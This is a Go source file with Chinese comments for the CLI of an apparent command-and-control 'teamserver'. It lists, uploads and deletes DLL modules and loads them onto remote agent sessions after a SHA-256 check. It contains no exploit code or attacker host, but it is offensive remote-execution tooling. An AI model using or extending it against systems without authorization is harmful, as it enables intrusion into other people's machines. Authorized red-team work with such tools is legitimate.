// CLI 模块仓库命令实现(list/upload/delete/load)。
// cobra 命令树见 cli_commands.go 的 moduleTree(原 moduleCmd 手写子 switch 已退役);
// 呈现层: 参数解析与打印; 业务经 service。
package cli

import (
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"cleat/teamserver/internal/service"
)

func (c *CLI) moduleList() {
	list, err := c.svc.ModuleList()
	if err != nil {
		c.Println("列出模块失败:", err)
		return
	}
	if len(list) == 0 {
		c.Println("仓库为空")
		return
	}
	c.Printf("%-30s %12s  %s\n", "模块名", "大小", "修改时间")
	for _, m := range list {
		c.Printf("%-30s %10d KB  %s\n", m.Name, m.Size/1024, m.Modified.Format(" 15:04:05"))
	}
}

func (c *CLI) moduleUpload(args []string) {
	if len(args) < 1 {
		c.Println("用法: module upload <path.dll> [name]")
		return
	}
	path := args[0]
	// 默认用文件名去 .dll 作 id
	name := ""
	if len(args) >= 2 {
		name = args[1]
	} else {
		base := filepath.Base(path)
		name = strings.TrimSuffix(base, ".dll")
		name = strings.TrimSuffix(name, ".DLL")
	}

	if err := c.svc.ValidateModuleName(name); err != nil {
		c.Println("模块名无效:", err)
		return
	}

	data, err := os.ReadFile(path)
	if err != nil {
		c.Println("读取文件失败:", err)
		return
	}

	info, err := c.svc.ModuleSave("", name, data)
	if err != nil {
		if errors.Is(err, service.ErrModuleExists) {
			c.Printf("模块 %s 已存在, 跳过\n", name)
			return
		}
		c.Println("上传失败:", err)
		return
	}
	c.Printf("✓ 模块 %s 已上传 (%d KB)\n", info.Name, info.Size/1024)
}

func (c *CLI) moduleDelete(args []string) {
	if len(args) < 1 {
		c.Println("用法: module delete <name>")
		return
	}
	name := args[0]
	if err := c.svc.ModuleDelete("", name); err != nil {
		if errors.Is(err, service.ErrModuleNotFound) {
			c.Printf("模块 %s 不存在\n", name)
			return
		}
		c.Println("删除失败:", err)
		return
	}
	c.Printf("✓ 模块 %s 已删除\n", name)
}

func (c *CLI) moduleLoad(args []string) {
	if len(args) < 2 {
		c.Println("用法: module load <sid> <name>")
		return
	}
	sid, err := parseSessionID(args[0], c.cur)
	if err != nil {
		c.Println("无效会话 ID:", err)
		return
	}
	name := args[1]

	// 三段式路径原样保留(CLI 需区分三种错误输出; 与 api 的合并路径差异见 service.ModuleGet 注):
	dllBytes, err := c.svc.ModuleGet(name)
	if err != nil {
		c.Println("获取模块失败:", err)
		return
	}

	// sha256 闭环: Agent 侧 ModuleLoad 对 params.sha256 强校验
	info, err := c.svc.ModuleHash(name)
	if err != nil || info.SHA256 == "" {
		c.Println("读取模块哈希失败, 拒绝下发")
		return
	}

	resp, err := c.svc.HybridUpload(sid, "ModuleLoad",
		map[string]interface{}{
			"cmd": "ModuleLoad",
			"params": map[string]interface{}{
				"module_id": name,
				"type":      1,
				"platform":  1,
				"sha256":    info.SHA256,
			},
		}, dllBytes)
	if err != nil {
		c.Println("下发失败:", err)
		return
	}
	c.Printf("✓ 模块 %s 已下发到会话 #%d\n", name, sid)
	if resp != nil {
		c.Printf("  响应: %s\n", mustJSON(resp))
	}
}

// parseSessionID 解析会话 ID(支持 "cur" 或数字)。
func parseSessionID(s string, cur int) (int, error) {
	if s == "cur" || s == "." {
		if cur <= 0 {
			return 0, fmt.Errorf("未选择会话(先 select <id>)")
		}
		return cur, nil
	}
	id := 0
	for _, ch := range s {
		if ch < '0' || ch > '9' {
			return 0, fmt.Errorf("无效会话 ID: %s", s)
		}
		id = id*10 + int(ch-'0')
	}
	if id <= 0 {
		return 0, fmt.Errorf("无效会话 ID: %s", s)
	}
	return id, nil
}
